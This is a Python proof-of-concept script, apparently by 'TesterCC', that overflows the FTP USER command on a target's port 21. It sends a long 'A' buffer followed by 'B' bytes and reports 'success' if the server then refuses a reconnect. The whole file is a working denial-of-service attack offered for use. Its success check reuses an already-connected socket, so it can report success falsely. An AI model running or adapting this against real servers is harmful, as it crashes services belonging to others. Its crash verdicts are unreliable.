# coding=utf-8
"""
DATE:   2021/12/7
AUTHOR: TesterCC
"""

import json
from optparse import OptionParser
import socket
import time

# initialization
ret = dict()
ret['status'] = None

s = socket.socket()
# 设置连接超时
s.settimeout(3)


def attack(ip):
    s.connect((ip, 21))

    buff = b"\x41" * 230 + b"\x42" * 4
    data = b"USER " + buff + b"\r\n"

    s.send(data)

    time.sleep(1)

    try:
        s.connect((ip, 21))

        ret['status'] = 'fail'

    except:
        ret['status'] = 'success'


def main():
    usage = "Usage: %prog --target <target ip>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target", help="server ip, e.g. 10.0.0.1")

    options, args = parse.parse_args()

    if not options.target:
        ret['status'] = "fail"
        return json.dumps(ret)

    attack(options.target)

    if not ret['status']:
        ret['status'] = 'fail'

    print(json.dumps(ret))
    return json.dumps(ret)


if __name__ == '__main__':
    main()
